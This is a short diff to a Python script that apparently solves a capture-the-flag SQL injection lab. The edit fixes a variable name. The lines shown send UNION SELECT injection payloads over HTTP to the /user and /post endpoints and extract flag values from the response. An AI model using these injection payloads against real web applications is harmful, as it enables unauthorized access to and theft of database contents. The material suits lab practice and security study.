@@ -92,7 +92,7 @@ def main(addr):
     # Retrieve Flag 4
 
     r = requests.get(f"http://{addr}/user?id=2 union select \"2 union select null,flag,null,null from flag\",null,null; -- -")
-    content = (resp.text)
+    content = (r.text)
     splitted = content.find('}')
     FLAG4 = ((content[(splitted-42):]).split('<'))[0]
     
@@ -107,7 +107,7 @@ def main(addr):
     # Retrieve Flag 5
 
     r = requests.get(f"http://{addr}/post?id='' UNION ALL SELECT 1,2,group_concat(flag),4 from sqhell_5.flag --")
-    content = (resp.text)
+    content = (r.text)
     splitted = content.find('}')
     FLAG5 = ((content[(splitted-42):]).split('<'))[0]
     
